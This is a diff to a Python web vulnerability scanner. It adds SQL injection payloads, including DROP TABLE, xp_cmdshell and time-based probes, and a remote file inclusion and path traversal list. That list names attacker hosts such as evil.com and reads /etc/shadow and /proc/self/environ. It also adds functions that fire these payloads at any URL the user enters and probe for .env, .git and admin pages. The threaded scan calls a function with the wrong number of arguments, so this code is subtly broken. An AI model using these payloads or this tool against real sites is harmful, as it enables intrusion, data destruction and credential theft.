@@ -49,7 +49,32 @@ SQL_PAYLOADS = [
     "' UNION SELECT null, username, password FROM users --",
     "'; DROP TABLE users --",
     '" OR "a"="a',
-    "'; SELECT * FROM information_schema.tables --"
+    "'; SELECT * FROM information_schema.tables --",
+    "' OR 'x'='x'",
+    "' AND 1=2 UNION SELECT 1,2,3,4,5 --",
+    "'; EXEC xp_cmdshell('dir') --",
+    "'; WAITFOR DELAY '0:0:5' --",
+    "admin' --",
+    "admin' #",
+    "' OR sleep(5) --",
+    "' AND (SELECT COUNT(*) FROM users) > 0 --",
+    "' UNION SELECT NULL,NULL,NULL --",
+    "'; SELECT @@version --"
+]
+
+RFI_PAYLOADS = [
+    "http://attacker.com/malicious_file.php",
+    "../../../../etc/passwd",
+    "../../../Windows/System32/drivers/etc/hosts",
+    "http://malicious-site.com/shell.php",
+    "/var/www/html/config.php",
+    "/proc/self/environ",
+    "../../../boot.ini",
+    "../../../../etc/shadow",
+    "../../../../etc/security/passwd",
+    "http://evil.com/code.php?cmd=id",
+    "../../../../usr/local/apache2/conf/httpd.conf",
+    "../../../../usr/local/etc/httpd/httpd.conf"
 ]
 
 def user_agent():
@@ -128,3 +153,146 @@ def check_sql_injection(url):
             file.write(f"Vulnerable URL: {url}\n")
             file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
         logging.info(f"{Fore.GREEN}[+] Results saved to sql_injection_results.txt{Style.RESET_ALL}")
+
+def check_rfi(url):
+    if not check_website(url):
+        return
+    
+    vulnerable = []
+
+    for payload in RFI_PAYLOADS:
+        encoded_payload = urllib.parse.quote(payload)
+
+        try:
+            response = requests.get(url, params={"file": encoded_payload}, headers=user_agent(), timeout=10)
+
+            error_patterns = ["Warning", "failed to open stream", "include(", "require(", "fopen(", "file_get_contents("]
+            if any(error in response.text for error in error_patterns):
+                logging.info(f"{Fore.GREEN}[+] RFI Vulnerability found at {url} with payload: {payload}{Style.RESET_ALL}")
+                vulnerable.append(payload)
+
+        except RequestException as e:
+            logging.error(f"{Fore.RED}[!] Error during RFI check on {url}: {e}{Style.RESET_ALL}")
+
+    if vulnerable:
+        with open("rfi_results.txt", "a") as file:
+            file.write(f"Vulnerable URL: {url}\n")
+            file.write("Payloads: \n" + "\n".join(vulnerable) + "\n\n")
+        logging.info(f"{Fore.GREEN}[+] Results saved to rfi_results.txt{Style.RESET_ALL}")
+
+def check_sensitive_files(url):
+    if not check_website(url):
+        return
+    
+    vulnerable_files = []
+    sensitive_files = ["/robots.txt", "/.git", "/.env", "/debug", "/config.php"]
+
+    for file in sensitive_files:
+        full_url = urllib.parse.urljoin(url, file)
+
+        try:
+            response = requests.get(full_url, headers=user_agent(), timeout=10)
+
+            if response.status_code == 200:
+                logging.info(f"{Fore.GREEN}[+] Sensitive file found: {full_url}{Style.RESET_ALL}")
+                vulnerable_files.append(full_url)
+
+        except RequestException as e:
+            logging.error(f"{Fore.RED}[!] Error accessing {full_url}: {e}{Style.RESET_ALL}")
+
+    if vulnerable_files:
+        with open("sensitive_files_results.txt", "a") as file:
+            file.write(f"Vulnerable URL: {url}\n")
+            file.write("Exposed Files:\n" + "\n".join(vulnerable_files) + "\n\n")
+        logging.info(f"{Fore.GREEN}[+] Results saved to sensitive_files_results.txt{Style.RESET_ALL}")
+
+def analyze_headers(url):
+    if not check_website(url):
+        return
+    
+    vulnerable_headers = []
+    
+    try:
+        response = requests.head(url, headers=user_agent(), timeout=10)
+        headers = response.headers
+        logging.info(f"{Fore.BLUE}[+] Analyzing headers for {url}{Style.RESET_ALL}")
+
+        header_checks = {
+            "X-Content-Type-Options": "MIME-sniffing attacks",
+            "Strict-Transport-Security": "MITM attacks",
+            "X-Frame-Options": "clickjacking attacks",
+            "X-XSS-Protection": "reflected XSS attacks"
+        }
+
+        for header, risk in header_checks.items():
+            if header not in headers:
+                logging.warning(f"{Fore.YELLOW}[!] Missing '{header}' header. This can expose the site to {risk}.{Style.RESET_ALL}")
+                vulnerable_headers.append(header)
+
+    except RequestException as e:
+        logging.error(f"{Fore.RED}[!] Error analyzing headers for {url}: {e}{Style.RESET_ALL}")
+
+    if vulnerable_headers:
+        with open("header_analysis_results.txt", "a") as file:
+            file.write(f"Vulnerable URL: {url}\n")
+            file.write("Missing Headers:\n" + "\n".join(vulnerable_headers) + "\n\n")
+        logging.info(f"{Fore.GREEN}[+] Results saved to header_analysis_results.txt{Style.RESET_ALL}")
+
+def check_vulnerabilities(url):
+
+    if not check_website(url):
+        return
+    
+    vulnerable_pages = [
+        "/admin", "/login", "/config", "/upload", "/backup", "/.git", "/wp-admin",
+        "/admin.php", "/test.php", "/debug", "/readme.html", "/login.php"
+    ]
+
+    vulnerable_found = []
+    threads = []
+
+    for page in vulnerable_pages:
+        full_url = urllib.parse.urljoin(url, page)
+        logging.info(f"{Fore.BLUE}[+] Testing page: {full_url}{Style.RESET_ALL}")
+
+        thread = threading.Thread(target=check_page_vulnerabilities, args=(full_url, vulnerable_found))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
+
+    if vulnerable_found:
+        with open("vulnerabilities_results.txt", "a") as file:
+            file.write(f"Vulnerable URL: {url}\n")
+            file.write("Exposed Endpoints:\n" + "\n".join(vulnerable_found) + "\n\n")
+        logging.info(f"{Fore.GREEN}[+] Results saved to vulnerabilities_results.txt{Style.RESET_ALL}")
+
+    analyze_headers(url)
+    check_sensitive_files(url)
+
+def check_page_vulnerabilities(page_url):
+    if not check_website(page_url):
+        return
+
+    try:
+        response = requests.get(page_url, headers=user_agent(), timeout=10)
+
+        if response.status_code == 200:
+            logging.info(f"{Fore.GREEN}[+] Potential vulnerability found at: {page_url}{Style.RESET_ALL}")
+            
+            check_xss(page_url)
+            check_sql_injection(page_url)
+            check_rfi(page_url)
+
+        elif response.status_code == 403:
+            logging.warning(f"{Fore.YELLOW}[!] Access Forbidden (403) at: {page_url}. Possible protected page.{Style.RESET_ALL}")
+
+        elif response.status_code in [301, 302]:
+            logging.warning(f"{Fore.BLUE}[+] Page redirected at: {page_url}. This could indicate a security issue.{Style.RESET_ALL}")
+
+    except RequestException as e:
+        logging.error(f"{Fore.RED}[!] Error accessing {page_url}: {e}{Style.RESET_ALL}")
+
+url = input("Enter website URL: ")
+check_vulnerabilities(url)
